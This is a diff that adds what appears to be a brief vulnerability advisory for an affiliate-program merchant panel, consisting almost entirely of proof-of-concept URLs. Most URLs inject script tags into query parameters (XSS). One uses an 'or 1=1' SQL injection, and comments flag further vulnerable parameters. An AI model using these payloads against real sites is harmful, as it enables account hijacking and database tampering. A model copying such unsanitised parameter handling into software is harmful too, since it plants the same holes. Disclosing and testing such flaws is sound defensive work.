@@ -1,0 +1,28 @@
+http://www.example.com/affiliate/merchants/index.php?
+Act=programedit&amp;mode=edit&amp;id=42&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;
+
+http://www.example.com/affiliate/merchants/index.php?Act=
+programedit&amp;mode=edit&amp;id=42&amp;msg=Program%20Edited%20Success
+fully&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;
+
+http://www.example.com/affiliate/merchants/index.php?Act=
+uploadProducts&amp;pgmid=41%20or%201=1 // SQL And XSS
+
+http://www.example.com/affiliate/merchants/index.php?Act=
+daily&amp;d=9&amp;m=07&amp;y=2007 // all variables XSS affected except Act
+
+http://www.example.com/affiliate/merchants/index.php?Act=
+ProgramReport&amp;programs=All&amp;err=Please%20Enter%20Valid%20Date
+&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;
+
+http://www.example.com/affiliate/merchants/index.php?Act=
+LinkReport&amp;sub=View&amp;i=1&amp;txtto=17/07/2007&amp;txtfrom=12/07/2007
+&amp;programs=All // all variables XSS affceted except Act y sub
+
+http://www.example.com/affiliate/merchants/temp.php?rowid=
+5&quot;&gt;&lt;script&gt;alert()&lt;/script&gt; // posible SQL too
+
+http://www.example.com/affiliate/merchants/index.php?Act=
+add_money&amp;msg=Please%20Enter%20A%20valid%20amount&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;
+&amp;modofpay=Authorize.net&amp;bankname=&amp;bankno=&amp;
+bankemail=&amp;bankaccount=&amp;payableto=&amp;minimumcheck=&amp;affiliateid=
